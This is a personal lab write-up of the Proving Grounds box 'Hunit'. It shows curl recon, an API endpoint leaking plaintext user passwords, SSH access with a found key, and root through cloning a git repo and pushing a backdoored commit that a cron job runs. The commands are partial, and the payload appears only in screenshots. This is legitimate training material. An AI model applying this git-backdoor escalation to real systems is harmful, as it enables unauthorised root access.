# Hunit Walkthrough
Name: Hunit
Date:  24/09/2022
Difficulty:  Medium
Goals:  OSCP 3/5 Medium in done walkthrough or writeup in a day  - Failed - busy SQLi learning, finish up next day.
Learnt:
- Comments in a Proving Grounds box..
- api in wordlists, but not api/!
- Tireness leads to bad fixation leads rabbit hole in the brain
- Git-filration 
- Git-filration Backdooring as PrivEsc

![](wackamole.png)

## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](Screenshots/ping.png)

users.txt:
```bash
curl http://192.168.141.125:8080 > 8080.html
cat 8080.html| grep -e "By " | awk -Fstrong '{print $2}' | tr -d '></' > users.txt
```

[[options-method-http___192.168.141.125_18030]] - post allowed

## Exploit
Hint Used
```
Scan all TCP ports. Find and enumerate a web application. Locate an endpoint on it that will help with the SSH service.
```

[[18030-script.js]] 

I am getting tired. Fixated too much on the JS. There is a comment with an /api/
![](apiconfused.png)
made [[test.txt]] to test if it is my fault
![](apiisnotin!.png)

ok...
![](ok.png)
/api/user/
```
[{"login":"rjackson","password":"yYJcgYqszv4aGQ","firstname":"Richard","lastname":"Jackson","description":"Editor","id":1},{"login":"jsanchez","password":"d52cQ1BzyNQycg","firstname":"Jennifer","lastname":"Sanchez","description":"Editor","id":3},{"login":"dademola","password":"ExplainSlowQuest110","firstname":"Derik","lastname":"Ademola","description":"Admin","id":6},{"login":"jwinters","password":"KTuGcSW6Zxwd0Q","firstname":"Julie","lastname":"Winters","description":"Editor","id":7},{"login":"jvargas","password":"OuQ96hcgiM5o9w","firstname":"James","lastname":"Vargas","description":"Editor","id":10}] 

dademola:ExplainSlowQuest110

```


Feel annoyed at how CTF-y this one has been. Especially as the privEsc went well without Walkthrough till I ran into the Git shell and this is really cool PrivEsc

## Foothold
Git user's ssh
![](sshkey.png)

## PrivEsc

![](git-server.png)

oh god.. return the next day to finish the box up and really enjoy the PrivEsc...
git sHELL:
![](ohgod.png)

```bash
git clone file:///git-server/
git log
git config --global user.name ""
git config --global user.name "user@Nomail.(none)" # Without email
```

![](contents.png)

```bash
[dademola@hunit git-server]$ git log
commit b50f4e5415cae0b650836b5466cc47c62faf7341 (HEAD -> master, origin/master, origin/HEAD)
Author: Dademola <dade@local.host>
Date:   Thu Nov 5 21:05:58 2020 -0300

    testing

commit c71132590f969b535b315089f83f39e48d0021e2
Author: Dademola <dade@local.host>
Date:   Thu Nov 5 20:59:48 2020 -0300

    testing

commit 8c0bc9aa81756b34cccdd3ce4ac65091668be77b
Author: Dademola <dade@local.host>
Date:   Thu Nov 5 20:54:50 2020 -0300

    testing
/path/
commit 574eba09bb7cc54628f574a694a57cbbd02befa0
Author: Dademola <dade@local.host>
Date:   Thu Nov 5 20:39:14 2020 -0300

    Adding backups

commit 025a327a0ffc9fe24e6dd312e09dcf5066a011b5
Author: Dademola <dade@local.host>
Date:   Thu Nov 5 20:23:04 2020 -0300

    Init

```
![](injection.png)

![](croncron.png)

Practice scp file transfer for good measure see as I has already found the id_rsa and I should rotated file transfer methods.

![](stillfancyscp.png)

Git repo exfiltration through ssh.
```bash
GIT_SSH_COMMAND='ssh -i /path/id_rsa -p 43022' git clone git@$ip:/git-server
```

![](gitdataexfiltration.png)

Git repo inflitration through ssh
```bash
GIT_SSH_COMMAND='ssh -i /path/id_rsa -p 43022' git push origin master
```

![](root.png)

This was AWESOME!